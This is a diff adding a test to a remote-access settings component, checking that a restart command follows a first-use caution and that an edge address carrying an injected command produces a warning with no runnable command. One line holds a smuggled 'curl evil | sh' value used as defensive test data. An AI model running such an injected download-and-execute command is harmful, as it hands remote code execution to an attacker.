@@ -205,6 +205,23 @@ describe('a retiring or retired edge address', () => {
     expect(callout.queryByText(/edge move https/)).toBeNull()
   })
 
+  it.each([
+    ['the service flag', { edge_url_flag: true }],
+    ['a move waiting for a restart', { restart_pending: true, moved_to: replacement }],
+  ] as const)('cautions a first-use notice and refuses an unusable address before %s', (_, extra) => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, first_use: true, ...extra } })
+    const { unmount } = render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    const caution = callout.getByText(/first connection to the edge/)
+    expect(caution.compareDocumentPosition(callout.getByText('sudo systemctl restart aether-server')) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+    unmount()
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh', ...extra } })
+    render(<RemoteAccessSection client={api()} />)
+    const unusable = within(screen.getByRole('status'))
+    expect(unusable.getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
+    expect(unusable.queryByText(/systemctl|cloudfield-server|Change the flag/)).toBeNull()
+  })
+
   it('tells other members a move waits for a restart', () => {
     seed('collaborator', { ...claimed, notice: { state: 'retiring', replacement, restart_pending: true } })
     render(<RemoteAccessSection client={api()} />)
